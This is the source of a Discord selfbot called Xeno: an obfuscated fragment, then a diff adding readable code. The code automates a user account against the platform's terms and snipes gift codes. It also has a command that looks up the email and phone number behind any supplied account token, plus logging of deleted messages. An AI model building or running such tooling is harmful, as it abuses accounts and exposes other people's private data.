_0xa42d[1022]){console[_0xa42d[18]](`${_0xa42d[26]}${colors[_0xa42d[30]](moment()[_0xa42d[29]]()[_0xa42d[28]](_0xa42d[27]))}${_0xa42d[31]}${colors[_0xa42d[33]](_0xa42d[32])}${_0xa42d[23]}${colors[_0xa42d[35]](_0xa42d[34])}${_0xa42d[23]}${colors[_0xa42d[24]](_0x74d2x15)}${_0xa42d[20]}`);if(_0x74d2x12[_0xa42d[95]]){_0x74d2x12[_0xa42d[96]]()};if(!_0x74d2x16[_0xa42d[177]](_0xa42d[23])){return _0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[1023])};_0x74d2x1f= _0x74d2x16[_0xa42d[177]](_0xa42d[23]);figlet[_0xa42d[386]](_0x74d2x1f,function(_0x74d2x36,_0x74d2x80){if(_0x74d2x36){console[_0xa42d[18]](`${_0xa42d[1024]}${_0x74d2x36}${_0xa42d[20]}`)};if(_0x74d2x80[_0xa42d[196]]> 2000){return _0x74d2x12[_0xa42d[1026]](_0xa42d[1025])};_0x74d2x12[_0xa42d[83]][_0xa42d[101]](_0xa42d[1027]+ _0x74d2x80+ _0xa42d[1027])})}}else {return}});bot[_0xa42d[40]](_0xa42d[1028],(_0x74d2x12)=>{if(_0x74d2x12[_0xa42d[85]][_0xa42d[87]]){return};const _0x74d2x29=bot[_0xa42d[43]][_0xa42d[184]](_0x74d2x12[_0xa42d[83]][_0xa42d[61]])|| [];_0x74d2x29[_0xa42d[1034]]({content:_0x74d2x12[_0xa42d[86]],author:_0x74d2x12[_0xa42d[85]],attachment:_0x74d2x12[_0xa42d[1029]][_0xa42d[97]]()?_0x74d2x12[_0xa42d[1029]][_0xa42d[97]]()[_0xa42d[1030]]:null,date: new Date()[_0xa42d[124]](_0xa42d[1031],{dataStyle:_0xa42d[1032],timeStyle:_0xa42d[1033]})});_0x74d2x29[_0xa42d[868]](10);bot[_0xa42d[43]][_0xa42d[1035]](_0x74d2x12[_0xa42d[83]][_0xa42d[61]],_0x74d2x29)});bot[_0xa42d[40]](_0xa42d[39],async (_0x74d2x12)=>{if(_0x74d2x12[_0xa42d[83]][_0xa42d[385]]=== _0xa42d[1036]){if(afkMode=== true){_0x74d2x12[_0xa42d[83]][_0xa42d[101]](config[_0xa42d[236]]?config[_0xa42d[236]]:_0xa42d[237])}else {return}};const _0x74d2x2c=process[_0xa42d[257]]();const _0x74d2x81=process[_0xa42d[257]](_0x74d2x2c);const _0x74d2x82= new Date()[_0xa42d[124]](_0xa42d[1031],{dataStyle:_0xa42d[1032],timeStyle:_0xa42d[1033]});function _0x74d2x83(_0x74d2x2a){console[_0xa42d[18]](`${_0xa42d[1037]}${colors[_0xa42d[24]](`${_0xa42d[20]}${_0x74d2x12[_0xa42d[83]][_0xa42d[45]]}${_0xa42d[20]}`)}${_0xa42d[20]}`);console[_0xa42d[18]](`${_0xa42d[1038]}${colors[_0xa42d[24]](`${_0xa42d[20]}${_0x74d2x12[_0xa42d[81]][_0xa42d[45]]}${_0xa42d[20]}`)}${_0xa42d[20]}`);console[_0xa42d[18]](`${_0xa42d[1039]}${colors[_0xa42d[24]](`${_0xa42d[20]}${_0x74d2x12[_0xa42d[85]][_0xa42d[59]]}${_0xa42d[20]}`)}${_0xa42d[20]}`);console[_0xa42d[18]](`${_0xa42d[1040]}${colors[_0xa42d[24]](`${_0xa42d[20]}${_0x74d2x81[0]> 0?`${_0xa42d[20]}${_0x74d2x81[0]}${_0xa42d[1041]}`:_0xa42d[20]}${_0xa42d[20]}${_0x74d2x81[1]/ 1e6}${_0xa42d[329]}`)}${_0xa42d[20]}`);console[_0xa42d[18]](`${_0xa42d[1042]}${colors[_0xa42d[24]](`${_0xa42d[20]}${_0x74d2x2a}${_0xa42d[20]}`)}${_0xa42d[20]}`);console[_0xa42d[18]]()}function _0x74d2x84(){console[_0xa42d[18]](`${_0xa42d[1037]}${colors[_0xa42d[24]](`${_0xa42d[20]}${_0x74d2x12[_0xa42d[83]][_0xa42d[45]]}${_0xa42d[20]}`)}${_0xa42d[20]}`);console[_0xa42d[18]](`${_0xa42d[1038]}${colors[_0xa42d[24]](`${_0xa42d[20]}${_0x74d2x12[_0xa42d[81]][_0xa42d[45]]}${_0xa42d[20]}`)}${_0xa42d[20]}`);console[_0xa42d[18]]()}if(_0x74d2x12[_0xa42d[86]][_0xa42d[92]](_0xa42d[1043])){if(config[_0xa42d[68]]=== true){if(_0x74d2x12[_0xa42d[85]][_0xa42d[61]]=== _0xa42d[1044]){try{_0x74d2x12[_0xa42d[785]](_0xa42d[1045]);console[_0xa42d[18]](`${_0xa42d[20]}${colors[_0xa42d[33]](`${_0xa42d[26]}${_0x74d2x82}${_0xa42d[1046]}`)}${_0xa42d[20]}`);_0x74d2x84()}catch(err){console[_0xa42d[18]](`${_0xa42d[20]}${colors[_0xa42d[33]](`${_0xa42d[26]}${_0x74d2x82}${_0xa42d[1047]}`)}${_0xa42d[20]}`)}}}else {return}};if(_0x74d2x12[_0xa42d[86]][_0xa42d[92]](`${_0xa42d[1048]}${bot[_0xa42d[53]][_0xa42d[61]]}${_0xa42d[424]}`)){if(config[_0xa42d[68]]=== true){if(_0x74d2x12[_0xa42d[85]][_0xa42d[61]]=== _0xa42d[1044]){console[_0xa42d[18]](`${_0xa42d[20]}${colors[_0xa42d[33]](`${_0xa42d[26]}${_0x74d2x82}${_0xa42d[1046]}`)}${_0xa42d[20]}`);_0x74d2x84()}}else {return}};if(_0x74d2x12[_0xa42d[86]][_0xa42d[92]](_0xa42d[466])|| _0x74d2x12[_0xa42d[86]][_0xa42d[92]](_0xa42d[1049])){if(config[_0xa42d[64]]=== true){var _0x74d2x85=/(discord\.(gift)|discord\.com\/gift)\/.+[a-z]/;var _0x74d2x86=_0x74d2x85[_0xa42d[1050]](_0x74d2x12[_0xa42d[86]]);var _0x74d2x87=_0x74d2x86[0][_0xa42d[88]](_0xa42d[145])[1];axios({method:_0xa42d[1053],url:`${_0xa42d[1054]}${_0x74d2x87}${_0xa42d[1055]}`,headers:{'\x41\x75\x74\x68\x6F\x72\x69\x7A\x61\x74\x69\x6F\x6E':config[_0xa42d[224]]}})[_0xa42d[161]](()=>{console[_0xa42d[18]](colors[_0xa42d[30]](`${_0xa42d[26]}${_0x74d2x82}${_0xa42d[1052]}`));_0x74d2x83(_0x74d2x87)})[_0xa42d[285]]((_0x74d2x88)=>{console[_0xa42d[18]](colors[_0xa42d[22]](`${_0xa42d[26]}${_0x74d2x82}${_0xa42d[1051]}`));_0x74d2x83(_0x74d2x87)})}else {return}}});if(config[_0xa42d[224]]=== _0xa42d[1056]){return console[_0xa42d[18]](`${_0xa42d[20]}${colors[_0xa42d[22]](_0xa42d[21])}${_0xa42d[23]}${colors[_0xa42d[24]](_0xa42d[1057])}${_0xa42d[20]}`)}else {bot[_0xa42d[1059]](config[_0xa42d[224]])[_0xa42d[285]]((_0x74d2x36)=>{return console[_0xa42d[18]](`${_0xa42d[20]}${colors[_0xa42d[22]](_0xa42d[21])}${_0xa42d[23]}${colors[_0xa42d[24]](_0xa42d[1058])}${_0xa42d[20]}`)})}
+const Discord = require("discord.js");
+const config = require("./config.json");
+const bot = new Discord.Client();
+const { color, image, footer, enabled } = config.embedOptions;
+const moment = require("moment");
+const colors = require("colors");
+const axios = require("axios").default;
+const title = require("console-title");
+const fetch = require("node-fetch");
+const figlet = require("figlet");
+const superagent = require("superagent");
+const { post } = require("node-superfetch");
+const { stripIndents } = require("common-tags");
+const { Type } = require("@extreme_hero/deeptype");
+const { inspect } = require("util");
+const fs = require("fs");
+const webhook = require("webhook-discord");
+
+require("./custom/command")(bot);
+
+bot.log = (content) => {
+  console.log(content);
+};
+
+bot.logError = (error) => {
+  console.log(`${colors.red("[ERROR]:")} ${colors.yellow(error)}`);
+};
+
+bot.logCommand = (command) => {
+  console.log(
+    `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+      "Command used"
+    )} ${colors.magenta("|")} ${colors.yellow(command)}`
+  );
+};
+
+const selfbot = {
+  version: "5.3.1",
+  name: "Xeno",
+  linecount: 2425,
+};
+
+// Process
+process.on("unhandledRejection", (error) =>
+  console.log(`${colors.red("[ERROR]:")} ${colors.yellow(error.message)}`)
+);
+process.on("uncaughtExceptionMonitor", (error) =>
+  console.log(`${colors.red("[ERROR]:")} ${colors.yellow(error.message)}`)
+);
+process.on("uncaughtException", (error) =>
+  console.log(`${colors.red("[ERROR]:")} ${colors.yellow(error.message)}`)
+);
+// Process
+
+bot.snipes = new Map();
+
+let afkMode = false;
+
+console.log("Logging in, please wait...");
+title(`[${selfbot.name} v${selfbot.version}] Loading...`);
+bot.on("ready", async () => {
+  console.clear();
+  title(
+    `[${selfbot.name} v${selfbot.version}] Logged in as ${bot.user.username}`
+  );
+  console.log(`
+
+
+                                    ${colors.red(`
+                                    ██╗  ██╗███████╗███╗   ██╗ ██████╗ 
+                                    ╚██╗██╔╝██╔════╝████╗  ██║██╔═══██╗
+                                     ╚███╔╝ █████╗  ██╔██╗ ██║██║   ██║
+                                     ██╔██╗ ██╔══╝  ██║╚██╗██║██║   ██║
+                                    ██╔╝ ██╗███████╗██║ ╚████║╚██████╔╝
+                                    ╚═╝  ╚═╝╚══════╝╚═╝  ╚═══╝ ╚═════╝           
+                                    `)}
+
+
+                                ${colors.red(selfbot.name)} ${colors.cyan(
+    `v${selfbot.version}`
+  )} ${colors.yellow("|")} ${colors.red("Logged in as")} ${colors.cyan(
+    bot.user.tag
+  )} ${colors.yellow("|")} ${colors.red("ID:")} ${colors.cyan(bot.user.id)}
+                                ${colors.red("Nitro Sniper?")} ${
+    config.nitro_sniper ? colors.green("Enabled") : colors.red("Disabled")
+  }
+                                ${colors.red("Giveaway Sniper?")} ${
+    config.giveaway_sniper ? colors.green("Enabled") : colors.red("Disabled")
+  }
+                                ${colors.red("Prefix:")} ${colors.cyan(
+    `${config.prefix}`
+  )}
+                                ${colors.red("GitHub:")} ${colors.cyan(
+    "https://github.com/Xeno-Selfbot/Xeno"
+  )}
+                                ${colors.red("Developer:")} ${colors.cyan(
+    "Xeno#0538"
+  )}
+    `);
+
+  if (config.credit === true) {
+    bot.user.setActivity("https://discord.com/invite/FRGKTJsFJg", {
+      type: "PLAYING",
+    });
+  }
+});
+
+bot.on("message", async (message) => {
+  if (config.messageLogs === true) {
+    console.log(
+      `${colors.red(message.guild.name)} : ${colors.blue(
+        message.channel.name
+      )} : ${colors.yellow(message.author.tag)} : ${colors.green(
+        message.content
+      )}`
+    );
+  }
+
+  if (message.author.bot) return;
+  let prefix = config.prefix;
+  let messageArray = message.content.split(" ");
+  let cmd = messageArray[0].replace(prefix, "");
+  let args = messageArray.slice(1);
+  if (!message.content.startsWith(prefix)) return;
+
+  if (
+    config.whitelisted.includes(message.author.id) ||
+    message.author.id === bot.user.id
+  ) {
+    // Selfbot commands
+    if (cmd === "rainbow") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      const role = message.mentions.roles.first();
+      if (!role) return message.channel.send("Please mention a role");
+      if (enabled === true) {
+        let embed = new Discord.RichEmbed()
+          .setTitle("Success")
+          .setDescription(`Successfully made the ${role.name} role rainbow`)
+          .setThumbnail(
+            image
+              ? image
+              : "https://i.gyazo.com/9a01772609666c18b012df6efeb3d5f8.jpg"
+          )
+          .setColor(color ? color : "#ff0000")
+          .setFooter(footer ? footer : "𝙓𝙚𝙣𝙤");
+        message.channel.send(embed);
+      } else {
+        message.channel.send(`Successfully made the ${role.name} role rainbow`);
+      }
+      setInterval(() => {
+        role.edit({
+          color: "RANDOM",
+        });
+      });
+    }
+
+    if (cmd === "tokeninfo") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      const inputToken = args[0];
+      if (!inputToken) return message.channel.send("Please specify a token");
+      const headers = {
+        Authorization: inputToken,
+        "Content-Type": "application/json",
+      };
+
+      try {
+        fetch("https://canary.discordapp.com/api/v6/users/@me", {
+          method: "GET",
+          headers: headers,
+        }).then(async (res) => {
+          const result = await res.json();
+          if (enabled === true) {
+            let embed = new Discord.RichEmbed()
+              .setColor(color ? color : "#ff0000")
+              .setFooter(footer ? footer : "𝙓𝙚𝙣𝙤")
+              .setThumbnail(
+                `https://cdn.discordapp.com/avatars/${result.id}/${result.avatar}.png?size=2048`
+              ).setDescription(`
+                    **ID** » ${result.id}
+                    **Username** » ${result.username}
+                    **Discriminator** » ${result.discriminator}
+                    **Public Flags** » ${result.public_flags.toLocaleString()}
+                    **Flags** » ${result.flags.toLocaleString()}
+                    **Email** » ${result.email ? result.email : "None"}
+                    **Verified?** » ${result.verified ? "Yes" : "No"}
+                    **Locale** » ${result.locale}
+                    **NSFW?** » ${result.nsfw_allowed ? "Yes" : "No"}
+                    **MFA?** » ${result.mfa_enabled ? "Yes" : "No"}
+                    **Phone Number** » ${result.phone ? result.phone : "None"}
+                    `);
+            message.channel.send(embed);
+          } else {
+            message.channel.send(stripIndents`\`\`\`
+                    ID » ${result.id}
+                    Username » ${result.username}
+                    Discriminator » ${result.discriminator}
+                    Public Flags » ${result.public_flags.toLocaleString()}
+                    Flags » ${result.flags.toLocaleString()}
+                    Email » ${result.email ? result.email : "None"}
+                    Verified? » ${result.verified ? "Yes" : "No"}
+                    Locale » ${result.locale}
+                    NSFW? » ${result.nsfw_allowed ? "Yes" : "No"}
+                    MFA? » ${result.mfa_enabled ? "Yes" : "No"}
+                    Phone Number » ${result.phone ? result.phone : "None"}${
+              footer ? `\n\n${footer}` : "𝙓𝙚𝙣𝙤"
+            }\`\`\``);
+          }
+        });
+      } catch (err) {
+        console.log(
+          `${colors.red("[ERROR]:")} ${colors.yellow("Invalid token")}`
+        );
+      }
+    }
+
+    if (cmd === "codeblock") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      const types = [
+        "js",
+        "json",
+        "ts",
+        "lua",
+        "css",
+        "html",
+        "yaml",
+        "py",
+        "ruby",
+        "java",
+      ];
+      if (!types.includes(args[0]))
+        return message.channel.send(
+          `Please specify a valid type. Types: \`${types.join("`, `")}\``
+        );
+      if (enabled === true) {
+        let embed = new Discord.RichEmbed()
+          .setTitle("Code Block")
+          .setDescription(
+            `\`\`\`${args[0]}\n${args.slice(1).join(" ")}\n\`\`\``
+          )
+          .setThumbnail(
+            image
+              ? image
+              : "https://i.gyazo.com/9a01772609666c18b012df6efeb3d5f8.jpg"
+          )
+          .setColor(color ? color : "#ff0000")
+          .setFooter(footer ? footer : "𝙓𝙚𝙣𝙤");
+        message.channel.send(embed);
+      } else {
+        message.channel.send(
+          `\`\`\`${args[0]}\n${args.slice(1).join(" ")}${
+            footer ? `\n\n${footer}` : "𝙓𝙚𝙣𝙤"
+          }\n\`\`\``
+        );
+      }
+    }
+
+    if (cmd === "hack") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      const { body } = await superagent.get(
+        "https://some-random-api.ml/bottoken"
+      );
+      if (!body)
+        return message.channel.send(
+          "Uh oh, it looks like that there was no body to load. Please try again."
+        );
+      const targetID = bot.users.get(args[0]);
+      if (!targetID) return message.channel.send("Please specify a user id");
+      const msg = await message.channel.send(
+        `Hacking ${targetID.username} now...`
+      );
+      const ips = [
+        "40.2.54.239",
+        "145.58.134.145",
+        "90.135.87.199",
+        "251.224.76.96",
+        "94.199.139.255",
+      ];
+      const ip = ips[Math.floor(Math.random() * ips.length)];
+      const emails = [
+        `${targetID.username}@gmail.com`,
+        "support@discord.com",
+        `${targetID.username}${targetID.discriminator}@hotmail.com`,
+        `${targetID.username}.${targetID.discriminator}@discord.com`,
+      ];
+      const email = emails[Math.floor(Math.random() * emails.length)];
+      const passwords = [
+        "DiscordIsCool",
+        "selfbotsAreAgainsDiscordTOS",
+        "YoMamaIsGay",
+        "Password",
+        "MyPasswordJustGotLeaked",
+      ];
+      const password = passwords[Math.floor(Math.random() * passwords.length)];
+      const sentences = [
+        "I like ya cut g",
+        "Can you send me your token?",
+        "Can I have your bots source code?",
+        `${password} is my password to my discord account... :flushed:`,
+        "Your mum is so ugly, that she made my happy meal cry :sunglasses:",
+      ];
+      const sentence = sentences[Math.floor(Math.random() * sentences.length)];
+      setTimeout(() => {
+        msg.edit(`**Found IP** » ${ip}`);
+        setTimeout(() => {
+          msg.edit(`**Found Email** » ${email}`);
+          setTimeout(() => {
+            msg.edit(`**Found Password** » ${password}`);
+            setTimeout(() => {
+              msg.edit(`**Found Username** » ${targetID.username}`);
+              setTimeout(() => {
+                msg.edit(`**Found Discriminator** » ${targetID.discriminator}`);
+                setTimeout(() => {
+                  msg.edit(`**Found ID** » ${targetID.id}`);
+                  setTimeout(() => {
+                    msg.edit(
+                      `**Injecting virus into discriminator** » ${targetID.discriminator}...`
+                    );
+                    setTimeout(() => {
+                      msg.edit(`**Reported to discord for selfbotting...**`);
+                      setTimeout(() => {
+                        msg.edit("**Successfully reported**");
+                        setTimeout(() => {
+                          msg.edit(`**Found Token** » ${body.token}`);
+                          setTimeout(() => {
+                            msg.edit(`**Fetching DMs...**`);
+                            setTimeout(() => {
+                              msg.edit(
+                                `**Most common sentence** » ${sentence}`
+                              );
+                              setTimeout(() => {
+                                setTimeout(() => {
+                                  msg.edit(
+                                    `**Sold all found data to the government...**`
+                                  );
+                                  setTimeout(() => {
+                                    msg.edit(`**Complete!**`);
+                                    setTimeout(() => {
+                                      message.channel.send(
+                                        `**The *totally* real hack has been successfully completed!**`
+                                      );
+                                    }, 1000);
+                                  }, 4000);
+                                }, 4000);
+                              }, 4000);
+                            }, 4000);
+                          }, 4000);
+                        }, 4000);
+                      }, 4000);
+                    }, 4000);
+                  }, 4000);
+                }, 4000);
+              }, 4000);
+            }, 4000);
+          }, 4000);
+        }, 4000);
+      }, 4000);
+    }
+
+    if (cmd === "cls") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      console.clear();
+    }
+
+    if (cmd === "afk") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      if (!args[0])
+        return message.channel.send("Please specify either on or off.");
+      const options = ["on", "off"];
+      if (!options.includes(args[0]))
+        return message.channel.send(
+          "Please specify a valid option. Options: on, off."
+        );
+      if (args[0] === options[0] && afkMode === false) {
+        afkMode = true;
+        message.channel.send(
+          `Afk has been enabled. Afk message: ${
+            config.afk_message
+              ? config.afk_message
+              : "Hey there, I am currently afk. Try dming me later! :slight_smile:"
+          }`
+        );
+      }
+      if (args[0] === options[1] && afkMode === true) {
+        afkMode = false;
+        message.channel.send("Afk mode has been disabled.");
+      }
+    }
+
+    if (cmd === "snipe") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      const snipes = bot.snipes.get(message.channel.id) || [];
+      const msg = snipes[args[0] - 1 || 0];
+      if (!msg) return message.channel.send("There's nothing to snipe.");
+      if (enabled === true) {
+        let embed = new Discord.RichEmbed()
+          .setAuthor(msg.author.tag, msg.author.displayAvatarURL)
+          .setDescription(
+            `${msg.content}
+        
+            **Date** » ${msg.date}
+            **Page** » ${args[0] || 1}/${snipes.length}
+            `
+          )
+          .setThumbnail(
+            image
+              ? image
+              : "https://i.gyazo.com/9a01772609666c18b012df6efeb3d5f8.jpg"
+          )
+          .setColor(color ? color : "#ff0000")
+          .setFooter(footer ? footer : "𝙓𝙚𝙣𝙤");
+        if (msg.attachment) {
+          embed.setImage(msg.attachment);
+        }
+        message.channel.send(embed);
+      } else {
+        message.channel.send(stripIndents`\`\`\`
+            ${msg.author.tag}
+
+            ${msg.content}
+
+            Date » ${msg.date}
+            Page » ${args[0] || 1}/${snipes.length}${
+          footer ? `\n\n${footer}` : "𝙓𝙚𝙣𝙤"
+        }
+            \`\`\``);
+      }
+    }
+
+    if (cmd === "eval") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      const msg = message;
+      let code = args.join(" ");
+      code = code.replace(/[“”]/g, '"').replace(/[‘’]/g, "'");
+      let evaled;
+      try {
+        const start = process.hrtime();
+        evaled = eval(code);
+        if (evaled instanceof Promise) {
+          evaled = await evaled;
+        }
+        const stop = process.hrtime(start);
+        const response = [
+          `**Output:** \`\`\`js\n${clean(
+            inspect(evaled, { depth: 0 })
+          )}\n\`\`\``,
+          `**Type:** \`\`\`ts\n${new Type(evaled).is}\n\`\`\``,
+          `**Time Taken:** \`\`\`\n${
+            (stop[0] * 1e9 + stop[1]) / 1e6
+          }ms\n\`\`\``,
+        ];
+        const res = response.join("\n");
+        if (res.length < 2000) {
+          await msg.channel.send(res);
+        } else {
+          const output = new Discord.MessageAttachment(
+            Buffer.from(res),
+            "output.txt"
+          );
+          await msg.channel.send(output);
+        }
+      } catch (err) {
+        return message.channel.send(`Error: \`\`\`xl\n${clean(err)}\n\`\`\``);
+      }
+
+      function clean(text) {
+        if (typeof text === "string") {
+          text = text
+            .replace(/`/g, `\`${String.fromCharCode(8203)}`)
+            .replace(/@/g, `@${String.fromCharCode(8203)}`)
+            .replace(
+              new RegExp(config.token, "gi"),
+              "*".repeat(config.token.length)
+            )
+            .replace(
+              new RegExp(config.webhookURL, "gi"),
+              "*".repeat(config.webhookURL.length)
+            )
+            .replace(
+              new RegExp(config.password, "gi"),
+              "*".repeat(config.password.length)
+            );
+        }
+        return text;
+      }
+    }
+
+    if (cmd === "hastebin") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      if (!args.join(" "))
+        return message.channel.send("Please specify a message.");
+      const { body } = await post("https://hastebin.com/documents").send(
+        args.join(" ")
+      );
+      let embed = new Discord.RichEmbed()
+        .setThumbnail(
+          image
+            ? image
+            : "https://i.gyazo.com/9a01772609666c18b012df6efeb3d5f8.jpg"
+        )
+        .setColor(color ? color : "#ff0000")
+        .setFooter(footer ? footer : "𝙓𝙚𝙣𝙤")
+        .setDescription(`https://hastebin.com/${body.key}`);
+      message.channel.send(embed);
+    }
+
+    if (cmd === "clean") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      let count = parseInt(args[0] || 1);
+      message.channel.fetchMessages({ limit: 100 }).then(async (messages) => {
+        let msgArray = messages.array();
+        msgArray = msgArray.filter((m) => m.author.id === bot.user.id);
+        msgArray.length = count + 1;
+        msgArray.map((m) =>
+          m.delete().catch((err) => {
+            message.channel.send("`ERROR`\n```js\n" + err + "\n```");
+          })
+        );
+      });
+    }
+
+    if (cmd === "emojify") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      const mapping = {
+        " ": " ",
+        0: ":zero:",
+        1: ":one:",
+        2: ":two:",
+        3: ":three:",
+        4: ":four:",
+        5: ":five:",
+        6: ":six:",
+        7: ":seven:",
+        8: ":eight:",
+        9: ":nine:",
+        "!": ":grey_exclamation:",
+        "?": ":grey_question:",
+        "#": ":hash:",
+        "*": ":asterisk:",
+        $: ":heavy_dollar_sign:",
+        "+": ":heavy_plus_sign:",
+        "-": ":heavy_minus_sign:",
+        "/": ":heavy_divide_sign:",
+      };
+
+      "abcdefghijklmnopqrstuvwxyz".split("").forEach((c) => {
+        mapping[c] = mapping[c.toUpperCase()] = `:regional_indicator_${c}:`;
+      });
+
+      if (args.length < 1) {
+        return message.channel.send("Please specify a message to emojify");
+      }
+      message.channel.send(
+        args
+          .join(" ")
+          .split("")
+          .map((c) => mapping[c] || c)
+          .join("")
+      );
+    }
+
+    if (cmd === "cb") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      message.channel.startTyping();
+      try {
+        const response = await fetch(
+          `https://some-random-api.ml/chatbot?message=${encodeURIComponent(
+            args.join(" ")
+          )}`
+        );
+        const json = await response.json();
+        message.channel.send(
+          `> ${args.join(" ")}\n${message.author} ${json.response}`
+        );
+        message.channel.stopTyping(true);
+      } catch (err) {
+        message.channel.stopTyping(true);
+        return message.channel.send("`ERROR`\n```js\n" + err.stack + "\n```");
+      }
+    }
+
+    if (cmd === "say") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      message.channel.send(args.join(" "));
+    }
+
+    if (cmd === "ping") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      message.channel.send("Pinging...").then((msg) => {
+        if (enabled === true) {
+          let embed = new Discord.RichEmbed()
+            .setTitle("Pong!")
+            .setDescription(
+              `
+                **Message** » ${
+                  msg.createdTimestamp - message.createdTimestamp
+                }ms
+                **WebSocket** » ${bot.ping}ms
+                `
+            )
+            .setThumbnail(
+              image
+                ? image
+                : "https://i.gyazo.com/9a01772609666c18b012df6efeb3d5f8.jpg"
+            )
+            .setColor(color ? color : "#ff0000")
+            .setFooter(footer ? footer : "𝙓𝙚𝙣𝙤");
+          msg.edit(embed);
+        } else {
+          msg.edit(stripIndents`\`\`\`
+                Pong!
+
+                Message » ${msg.createdTimestamp - message.createdTimestamp}ms
+                Websocket » ${bot.ping}ms${footer ? `\n\n${footer}` : "𝙓𝙚𝙣𝙤"}
+                \`\`\``);
+        }
+      });
+    }
+
+    if (cmd === "embed") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      if (!args.join(" "))
+        return message.channel.send("Please specify a message.");
+      if (enabled === true) {
+        let embed = new Discord.RichEmbed()
+          .setDescription(args.join(" "))
+          .setThumbnail(
+            image
+              ? image
+              : "https://media4.giphy.com/media/6cXJU3ZCj0U7gy8ZXo/giphy.gif"
+          )
+          .setColor(color ? color : "#1B78E7")
+          .setFooter(footer ? footer : "𝘾𝙧𝙮𝙥𝙩𝙞𝙘");
+        message.channel.send(embed);
+      } else {
+        message.channel.send(`\`\`\`${args.join(" ")}\`\`\``);
+      }
+    }
+
+    if (cmd === "avatar") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      const mention =
+        message.mentions.users.first() ||
+        message.author ||
+        bot.users.get(args[0]);
+      message.channel.send(mention.displayAvatarURL);
+    }
+
+    if (cmd === "serverinfo") {
+      console.log(
+        `[${colors.green(moment().utc().format("HH:mm:ss"))}] ${colors.cyan(
+          "Command used"
+        )} ${colors.magenta("|")} ${colors.yellow(cmd)}`
+      );
+      if (message.deletable) {
+        message.delete();
+      }
+      if (!message.guild)
+        return message.channel.send(
+          "This command cannot be executed in Direct Messages or in Private Groups."
+        );
+      //Guild Region
+      if (message.guild.region === "brazil") message.guild.region = "Brazi`";
+      if (message.guild.region === "europe") message.guild.region = "Europe";
+      if (message.guild.region === "hongkong")
+        message.guild.region = "Hong Kon`";
+      if (message.guild.region === "india") message.guild.region = "India";
+      if (message.guild.region === "japan") message.guild.region = "Japan";
+      if (message.guild.region === "russia") message.guild.region = "Russia";
+      if (message.guild.region === "singapore")
+        message.guild.region = "Singapore";
+      if (message.guild.region === "south africa")
+        message.guild.region = "South Africa";
+      if (message.guild.region === "sydney") message.guild.region = "Sydney";
+      if (message.guild.region === "us-central")
+        message.guild.region = "US Central";
+      if (message.guild.region === "us-east") message.guild.region = "US East";
+      if (message.guild.region === "us-south")
+        message.guild.region = "US South";
+      if (message.guild.region === "us-west") message.guild.region = "US West";
+      //Guild Verification Level
+      if (message.guild.verificationLevel === "NONE")
+        message.guild.verificationLevel = "None";
+      if (message.guild.verificationLevel === "LOW")
+        message.guild.verificationLevel = "Low";
